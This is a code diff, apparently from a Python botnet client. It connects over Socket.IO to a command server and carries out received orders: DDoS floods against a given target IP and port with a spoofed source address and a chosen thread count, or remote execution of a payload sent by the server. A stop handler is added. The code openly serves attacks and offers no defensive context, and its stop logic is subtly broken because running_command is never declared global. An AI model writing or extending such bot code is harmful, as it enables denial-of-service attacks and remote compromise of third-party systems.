@@ -3,10 +3,12 @@ from commands.ddos import CommandDDoS
 from commands.command import Command, CommandType
 import socketio
 
-socket_client = socketio.AsyncClient()
+socket_client = socketio.Client()
 
-async def start_server() -> None:
-    await socket_client.connect("ip")
+running_command: Command = None
+
+def start_server() -> None:
+    socket_client.connect("ws://localhost:5000")
 
 # SocketIO event definitions
 @socket_client.event
@@ -23,14 +25,22 @@ def disconnect():
     print("Disconnected from SocketIO server")
 
 @socket_client.on('command')
-def on_command(sid: str, data):
-    command: Command
-    if data['type'] == CommandType.DDOS:
-        command = CommandDDoS(data['target'])
+def on_command(data):
+    command: Command = None
+    print(type(CommandType.DDoS))
+    print(type(data['type']))
+    if data['type'] == CommandType.DDoS:
+        command = CommandDDoS(data['target_ip'], data['target_port'], data['fake_ip'], data['nb_threads'])
     elif data['type'] == CommandType.RCE:
         command = CommandRCE(data['payload'])
 
     if command is not None:
-        command.process()
+        running_command = command
+        running_command.process()
     else:
         print('Error, command {} does not exists'.format(data['type']))
+
+@socket_client.on('stop')
+def on_stop():
+    if running_command is not None:
+        running_command.stop()
